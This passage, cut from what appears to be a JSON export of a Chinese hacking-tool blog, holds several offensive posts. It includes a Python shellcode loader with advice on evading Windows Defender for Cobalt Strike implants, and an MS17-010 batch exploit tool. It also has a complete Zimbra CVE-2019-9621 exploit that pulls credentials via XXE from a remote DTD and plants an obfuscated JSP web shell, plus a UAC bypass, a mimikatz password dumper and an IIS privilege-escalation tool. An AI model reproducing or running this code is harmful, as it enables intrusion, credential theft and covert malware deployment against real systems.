\"DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4\" shellcode=bytearray(sys.argv[1].decode(\"hex\")) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) 下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候， 首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。 除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。 &nbsp;0x004 实战CS上线 一、Hex ShellCode 1.首先使用CS生成标准C格式的payload，格式（\\xfc\\xe8\\x89\\x00）在飞刀里我定义为Char格式 2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。 具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex 其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式 3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。 如果我没记错此方式目前也还能过Win10系统自带的Defender 不知大家有没发现Hex字符串除了不被杀以外，还无需落地 而Bin文件需要落地且被Defender杀(这个我肯定没有记错) 二、Base64(Hex) ShellCode 当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。 ScRunBase64.py 执行Base64格式ShellCode代码如下 #scrun by k8gege import ctypes import sys import base64 #calc.exe #REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA== shellcode=bytearray(base64.b64decode(sys.argv[1]).decode(\"hex\")) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) &nbsp; 0x005 下载 &nbsp;https://github.com/k8gege/scrun &nbsp;https://github.com/k8gege/K8tools/blob/master/scrun.exe &nbsp;https://github.com/k8gege/K8tools/blob/master/scrun.py &nbsp; PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload? 那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload? 溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。 此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。 但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。 同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。 其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马 发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。 ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。 所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。 而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了 看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？ 现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件 当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法 基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"免杀","slug":"bypassAV","permalink":"http://k8gege.org/categories/bypassAV/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/categories/Metasploit/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"},{"name":"ShellCode","slug":"ShellCode","permalink":"http://k8gege.org/categories/ShellCode/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/categories/Python/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/tags/Metasploit/"},{"name":"BypassAV","slug":"BypassAV","permalink":"http://k8gege.org/tags/BypassAV/"}]},{"title":"SMB溢出工具加强版","slug":"SMB溢出工具加强版","date":"2019-12-02T16:00:00.000Z","updated":"2020-06-11T16:21:38.818Z","comments":true,"path":"p/68a8bf1b.html","link":"","permalink":"http://k8gege.org/p/68a8bf1b.html","excerpt":"","text":"工具:k8加强版zzz 编译:python 漏洞:MS17-010 用法: zzz_exploit.exe 192.11.22.82zzz_exploit.exe 192.11.22.82 exe参数zzz_exploit.exe 192.11.22.82 exe参数 管道名 如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start 内网批量 可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可） 因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat 溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。 &nbsp; 链接: https://github.com/k8gege/K8tools/blob/master/k8zzz.rar","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"MS17010","slug":"MS17010","permalink":"http://k8gege.org/tags/MS17010/"},{"name":"SMB","slug":"SMB","permalink":"http://k8gege.org/tags/SMB/"}]},{"title":"CVE-2019-9621 Zimbra<8.8.11 GetShell Exploit","slug":"Zimbra CVE-2019-9621 GetShell Exploit","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:12:49.560Z","comments":true,"path":"p/19452dd9.html","link":"","permalink":"http://k8gege.org/p/19452dd9.html","excerpt":"","text":"发现时间 2019年03月18日 威胁目标 采用Zimbra邮件系统的企业 主要风险 远程代码执行 攻击入口 localconfig.xml &nbsp;配置文件 使用漏洞 CVE-2019-9621 受影响应用 ZimbraCollaboration Server 8.8.11&nbsp;之前的版本都受到影响。 已知影响 导致服务器信息泄露 威胁程度 高 &nbsp; 漏洞描述： 当&nbsp;Zimbra&nbsp;存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取&nbsp;localconfig.xml配置文件，获取到&nbsp;zimbra admin ldap password，并通过&nbsp;7071 admin&nbsp;端口进行&nbsp;SOAP AuthRequest&nbsp;认证，得到&nbsp;admin authtoken漏洞是利用XXE和ProxyServlet SSRF&nbsp;漏洞拿到&nbsp;admin authtoken&nbsp;后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。不过由于Zimbra在单服务器安装中尽管Memcached虽然启动但是并没有进行使用，所以其攻击场景受到限制。 影响版本： ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说： Zimbra &lt; 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。 Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。 &nbsp;GetShell代码 #coding=utf8 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) base_url=sys.argv[1] base_url=base_url.rstrip(\"/\") #upload file name and content #modify by k8gege #Connect \"shell.jsp\" using K8fly CmdShell #Because the CMD parameter is encrypted using Base64(bypass WAF) filename = \"shell.jsp\" fileContent = r'&lt;%@page import=\"java.io.*\"%&gt;&lt;%@page import=\"sun.misc.BASE64Decoder\"%&gt;&lt;%try {String cmd = request.getParameter(\"tom\");String path=application.getRealPath(request.getRequestURI());String dir=\"weblogic\";if(cmd.equals(\"NzU1Ng\")){out.print(\"[S]\"+dir+\"[E]\");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(\"-&gt;|\");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print(\"|&lt;-\");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%&gt;' print(base_url) #dtd file url dtd_url=\"https://k8gege.github.io/zimbra.dtd\" \"\"\" &lt;!ENTITY % file SYSTEM \"file:../conf/localconfig.xml\"&gt; &lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;\"&gt; \"\"\" xxe_data = r\"\"\"&lt;!DOCTYPE Autodiscover [ &lt;!ENTITY % dtd SYSTEM \"{dtd}\"&gt; %dtd; %all; ]&gt; &lt;Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\"&gt; &lt;Request&gt; &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt; &lt;/Request&gt; &lt;/Autodiscover&gt;\"\"\".format(dtd=dtd_url) #XXE stageheaders = { “Content-Type”:”application/xml”}print(“[*] Get User Name/Password By XXE “)r = requests.post(base_url+”/Autodiscover/Autodiscover.xml”,data=xxe_data,headers=headers,verify=False,timeout=15)#print r.textif ‘response schema not available’ not in r.text: print(“have no xxe”) exit() #low_token Stageimport repattern_name = re.compile(r”&lt;key name=(&quot;|”)zimbra_user(&quot;|”)&gt;\\n.?&lt;value&gt;(.?)&lt;/value&gt;”)pattern_password = re.compile(r”&lt;key name=(&quot;|”)zimbra_ldap_password(&quot;|”)&gt;\\n.?&lt;value&gt;(.?)&lt;/value&gt;”)username = pattern_name.findall(r.text)[0][2]password = pattern_password.findall(r.text)[0][2]print(username)print(password) auth_body=”””&lt;soap:Envelope xmlns:soap=”http://www.w3.org/2003/05/soap-envelope&quot;&gt; &lt;soap:Header&gt; &lt;context xmlns=”urn:zimbra”&gt; &lt;userAgent name=”ZimbraWebClient - SAF3 (Win)” version=”5.0.15_GA_2851.RHEL5_64”/&gt; &lt;/context&gt; &lt;/soap:Header&gt; &lt;soap:Body&gt; &lt;AuthRequest xmlns=”{xmlns}”&gt; &lt;account by=”adminName”&gt;{username}&lt;/account&gt; &lt;password&gt;{password}&lt;/password&gt; &lt;/AuthRequest&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;“””print(“[*] Get Low Privilege Auth Token”)r=requests.post(base_url+”/service/soap”,data=auth_body.format(xmlns=”urn:zimbraAccount”,username=username,password=password),verify=False) pattern_auth_token=re.compile(r”&lt;authToken&gt;(.*?)&lt;/authToken&gt;”) low_priv_token = pattern_auth_token.findall(r.text)[0] #print(low_priv_token) SSRF+Get Admin_Token Stageheaders[“Cookie”]=”ZM_ADMIN_AUTH_TOKEN=”+low_priv_token+”;”headers[“Host”]=”foo:7071”print(“[*] Get Admin Auth Token By SSRF”)r = requests.post(base_url+”/service/proxy?target=https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False) admin_token =pattern_auth_token.findall(r.text)[0]#print(“ADMIN_TOKEN:”+admin_token) f = { ‘filename1’:(None,”whocare”,None), ‘clientFile’:(filename,fileContent,”text/plain”), ‘requestId’:(None,”12”,None),} headers ={ “Cookie”:”ZM_ADMIN_AUTH_TOKEN=”+admin_token+”;”}print(“[] Uploading file”)r = requests.post(base_url+”/service/extension/clientUploader/upload”,files=f,headers=headers,verify=False)#print(r.text)print(“Shell: “+base_url+”/downloads/“+filename)#print(“Connect &quot;shell.jsp&quot; using K8fly CmdShell\\nBecause the CMD parameter is encrypted using Base64(bypass WAF)”)print(“[] Request Result:”)s = requests.session()r = s.get(base_url+”/downloads/“+filename,verify=False,headers=headers)#print(r.text)print(“May need cookie:”)print(headers[‘Cookie’]) &nbsp; 配合Cscan使用(批量使用url.txt) Cscan.ini配置如下 Cscan扫禁ping机器需加nocheck参数 钟馗之眼随便抓一些Zimbra来测试，发现成功率高达90% &nbsp; 下载 EXP: https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py Cscan: https://www.cnblogs.com/k8gege/p/10519321.html MSF:&nbsp;&nbsp; https://github.com/k8gege/ZimbraExploit","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"Zimbra","slug":"Zimbra","permalink":"http://k8gege.org/tags/Zimbra/"}]},{"title":"K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本","slug":"bypassUAC(Win7Wi8Win10)","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:22:11.286Z","comments":true,"path":"p/41e1c61c.html","link":"","permalink":"http://k8gege.org/p/41e1c61c.html","excerpt":"","text":"[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本 工具: k8uac编译: VC++ 作者:K8哥哥发布:&nbsp;2018/11/25 1:30 这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。 不但支持全系统而且还免杀,你让我上哪说理去。 免杀报告:http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6 示例如下: C:\\Users\\K8team\\Desktop&gt;k8uacBypassUAC (Win7/Win8/Win10) by K8哥哥useage:k8uac cmdlineC:\\Users\\K8team\\Desktop&gt;k8uac \"net user k8test k8test /add\"BypassUAC (Win7/Win8/Win10) by K8哥哥success!0操作成功完成。 &nbsp;下载：https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar","categories":[{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"BypassUAC","slug":"BypassUAC","permalink":"http://k8gege.org/tags/BypassUAC/"}]},{"title":"mimikatz 2.1.1一键版 & PowerShell","slug":"mimikatz一键版&PowerShell","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:24:06.585Z","comments":true,"path":"p/77429fa6.html","link":"","permalink":"http://k8gege.org/p/77429fa6.html","excerpt":"","text":"无需任何参数,运行EXE即可自动读取Windows系统密码 EXE版需要其它功能请使用原版 (参数已写死仅读密码) 结果保存于当前目录mz.log EXE https://github.com/k8gege/K8tools/blob/master/mz.exe https://github.com/k8gege/K8tools/blob/master/mz64.exe PowerShell https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1","categories":[{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/categories/PowerShell/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/tags/PowerShell/"},{"name":"mimikatz","slug":"mimikatz","permalink":"http://k8gege.org/tags/mimikatz/"}]},{"title":"全版本IIS提权工具iislpe","slug":"全版本IIS提权工具iislpe","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:18:45.584Z","comments":true,"path":"p/6b9b3afe.html","link":"","permalink":"http://k8gege.org/p/6b9b3afe.html","excerpt":"","text":"工具: iislpe.exe 编译: .net 3.5 全版本IIS提权工具,支持IIS应用池用户/网络服务用户/本地服务用户 原理: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。 用法: IIS Priviledge by k8gegeIIS APPPOOL / Network Service / Local ServiceUseage:iislpe c:\\any.batiislpe c:\\any.exe &nbsp; &nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;","categories":[{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"LPE","slug":"LPE","permalink":"http://k8gege.org/tags/LPE/"},{"name":"IIS","slug":"IIS","permalink":"http://k8gege.org/tags/IIS/"}]},{"title":"基于Browser协议探测内网主机","slug":"基于Browser协议探测内网主机","date":"2019-12-02T16:00:00.000Z","updated":"2020-06-06T02:28:01.279Z","comments":true,"path":"p/16b5ff0b.html","link":"","permalink":"http://k8gege.org/p/16b5ff0b.html","excerpt":"","text":"利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图 浏览 在SMB协议中，计算机为了访问网络资源，就需要了解网络上存在的资源列表（例如在Windows下使用网络邻居查看可以访问的计算机），这个机制就被称为浏览（Browsing）。虽然SMB协议中经常使用广播的方式，但如果每次都使用广播的方式了解当前的网络资源（包括提供服务的计算机和各个计算机上的服务资源），就需要消耗大量的网络资源和浪费较长的查找时间，因此最好在网络中维护一个网络资源的列表，以方便查找网络资源。只有必要的时候，才重新查找资源，例如使用Windows下的查找计算机功能。 但没有必要每个计算机都维护整个资源列表，维护网络中当前资源列表的任务由网络上的几个特殊计算机完成的，这些计算机被称为Browser，这些Browser通过记录广播数据或查询名字服务器来记录网络上的各种资源。 Browser并不是事先指定的计算机，而是在普通计算机之间通过自动进行的推举产生的。不同的计算机可以按照其提供服务的能力，设置在推举时具备的不同权重。为了保证一个Browser停机时网络浏览仍然正常，网络中常常存在多个Browser，一个为主Browser（Master Browser），其他的为备份Browser。 工作组和域 工作组和域这两个概念在进行浏览时具备同样的用处，都是用于区分并维护同一组浏览数据的多个计算机。事实上他们的不同在于认证方式上，工作组中每台计算机都基本上是独立的，独立对客户访问进行认证，而域中将存在一个（或几个）域控制器，保存对整个域中都有效的认证信息，包括用户的认证信息以及域内成员计算机的认证信息。浏览数据的时候，并不需要认证信息，Microsoft将工作组扩展为域，只是为了形成一种分级的目录结构，将原有的浏览和目录服务相结合，以扩大Mircrosoft网络服务范围的一种策略。 工作组和域都可以跨越多个子网，因此网络中就存在两种Browser，一种为Domain Master Browser ，用于维护整个工作组或域内的浏览数据，另一种为Local Master Browser，用于维护本子网内的浏览数据，它和Domain Master Browser通信以获得所有的可浏览数据。划分这两种Browser 主要是由于浏览数据依赖于本地网广播来获得资源列表，不同子网之间只能通过浏览器之间的交流能力，才能互相交换资源列表。 但是，为了浏览多个子网的资源，必须使用NBNS名字服务器的解析方式，没有NBNS的帮助，计算机将不能获得子网外计算机的NetBIOS名字。Local Master Browser也需要查询NetBIOS名字服务器以获得Domain Master Browser的名字，以相互交换网络资源信息。 由于域控制器在域内的特殊性，因此域控制器倾向于被用做Browser，主域控制器应该被用作Domain Master Browser，他们在推举时设置的权重较大。 Browser发包时间 去年无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2分钟、5分钟、甚至12分钟等才发 几分钟甚至于10几分钟才有一条，其它数据包每分钟几百条，可能很多人长时间抓包，也未能发现关键信息 不单只是很长时间才发，而且也不一定每个包里面都含有机器名，或许这就是一直以来把Browser忽略的真相 如图所示，出现13机器ID为6247数据包，出现15机器已达到2万多，出现10机器已7万多个包(这鬼才能发现) 所以为了能够获取到内网机器信息，我们需要不停的监视Browser包，从中提取有效机器名与系统版本 &nbsp;无视防火墙 虽然属于SMB协议，但把文件和共享前的勾去掉依旧可获取,该报文是由目标机器向外发送，所以445关闭也不影响 在目标开启防火墙的情况下也可获取,这与cping通过445端口或ICMP探测主机方式不一样。另外发现NBNS也含有机器名和域名,但无系统版本,如下图 操作系统、域机器判断 除了XP和WIN8.1特别一点以外，其它系统 0x00000002 Request XP名称第3位开始&nbsp; Win8.1也是 无法判断系统版本0x0000000c Domain &nbsp;域内机器其它 of o1 localby K8哥哥 2018.11.26 &nbsp;利用代码 暂时没时间用其它语言编写,先用python的scapy框架来实现,如果要编译成可执行文件可能会很大,可能还要安装相关依赖 &nbsp; # -*- coding: UTF-8 -*- #author: k8gege #https://github.com/k8gege/K8tools/blob/master/K8getPC.py #https://www.cnblogs.com/k8gege import sys import queue from scapy.all import * from pprint import pprint def search(data, key): #print “data: “ + data i=data.find(key) if i &gt; -1: masterType = “617574686F723A206B3867656765” masterType = data[i+len(key):i+len(key)+2] if masterType==”02”: return data[i+len(key)+4:i+len(key)+34],masterType,data[i+len(key)+44:i+len(key)+48] return data[i+len(key)+12:i+len(key)+42],masterType,data[i+len(key)+44:i+len(key)+48] return “” def getver(data): if data==”0500”: return “Win2000” elif data==”0501”: return “WinXP” elif data==”0502”: return “Win2003” elif data==”0600”: return “Vista” elif data==”0601”: return “Win7_2008” elif data==”0602”: return “Win8_2012” elif data==”0603”: return “Win8.1” elif data==”0a00”: return “Win10_2016” return data def packet_callbacke(packet): #print(packet.show()) try: data=packet.load.encode(‘hex’) osname,masterType,osver = search(data, “5c4d41494c534c4f545c42524f57534500”) if (osname!=””): if masterType==”0c”: print packet.getlayer(IP).src+”\\t”+packet.src+”\\t”+osname.decode(‘hex’)+”\\t[Domain]” else: print packet.getlayer(IP).src+”\\t”+packet.src+”\\t”+osname.decode(‘hex’)+”\\t[“+getver(osver)+”]” except: pass print “IP\\t\\tMAC\\t\\t\\tOSname\\t\\tOSver” try: sniff(iface = sys.argv[1],filter=””, prn=packet_callbacke)except: pass 下载: https://github.com/k8gege/K8tools/blob/master/K8getPC.py https://github.com/k8gege/k8getPC &nbsp; 相关文章: Cscan 获取内网主机开放Web、Banner、标题信息 https://www.cnblogs.com/k8gege/p/10519321.html Cping 获取内网存活主机-MAC地址-主机名--操作系统--SMB漏洞 https://www.cnblogs.com/k8gege/p/10367844.html","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/categories/Python/"},{"name":"内网渗透","slug":"Lan-Pentest","permalink":"http://k8gege.org/categories/Lan-Pentest/"},{"name":"源码","slug":"Code","permalink":"http://k8gege.org/categories/Code/"},{"name":"主机发现","slug":"OnlinePC","permalink":"http://k8gege.org/categories/OnlinePC/"},{"name":"嗅探","slug":"Sniffer","permalink":"http://k8gege.org/categories/Sniffer/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"},{"name":"编程","slug":"Program","permalink":"http://k8gege.org/categories/Program/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Code","slug":"Code","permalink":"http://k8gege.org/tags/Code/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/tags/Python/"}]}],"categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"},{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"远程执行","slug":"Rce","permalink":"http://k8gege.org/categories/Rce/"},{"name":"密码爆破","slug":"Brute-Force","permalink":"http://k8gege.org/categories/Brute-Force/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"},{"name":"内网渗透","slug":"Lan-Pentest","permalink":"http://k8gege.org/categories/Lan-Pentest/"},{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"},{"name":"持久化","slug":"Persistence","permalink":"http://k8gege.org/categories/Persistence/"},{"name":"DLL劫持","slug":"DllHijack","permalink":"http://k8gege.org/categories/DllHijack/"},{"name":"主机发现","slug":"OnlinePC","permalink":"http://k8gege.org/categories/OnlinePC/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/categories/Kali/"},{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"嗅探","slug":"Sniffer","permalink":"http://k8gege.org/categories/Sniffer/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/categories/Metasploit/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/categories/PowerShell/"},{"name":"源码","slug":"Code","permalink":"http://k8gege.org/categories/Code/"},{"name":"编程","slug":"Program","permalink":"http://k8gege.org/categories/Program/"},{"name":"ShellCode","slug":"ShellCode","permalink":"http://k8gege.org/categories/ShellCode/"},{"name":"免杀","slug":"bypassAV","permalink":"http://k8gege.org/categories/bypassAV/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/categories/Python/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"netbios","slug":"netbios","permalink":"http://k8gege.org/tags/netbios/"},{"name":"Proxy","slug":"Proxy","permalink":"http://k8gege.org/tags/Proxy/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"OXID","slug":"OXID","permalink":"http://k8gege.org/tags/OXID/"},{"name":"LPE","slug":"LPE","permalink":"http://k8gege.org/tags/LPE/"},{"name":"RCE","slug":"RCE","permalink":"http://k8gege.org/tags/RCE/"},{"name":"CVE-2020-0796","slug":"CVE-2020-0796","permalink":"http://k8gege.org/tags/CVE-2020-0796/"},{"name":"SMBGhost","slug":"SMBGhost","permalink":"http://k8gege.org/tags/SMBGhost/"},{"name":"WebShell","slug":"WebShell","permalink":"http://k8gege.org/tags/WebShell/"},{"name":"ladon","slug":"ladon","permalink":"http://k8gege.org/tags/ladon/"},{"name":"webser","slug":"webser","permalink":"http://k8gege.org/tags/webser/"},{"name":"runas","slug":"runas","permalink":"http://k8gege.org/tags/runas/"},{"name":"Rce","slug":"Rce","permalink":"http://k8gege.org/tags/Rce/"},{"name":"brute force","slug":"brute-force","permalink":"http://k8gege.org/tags/brute-force/"},{"name":"ssh","slug":"ssh","permalink":"http://k8gege.org/tags/ssh/"},{"name":"Cobalt 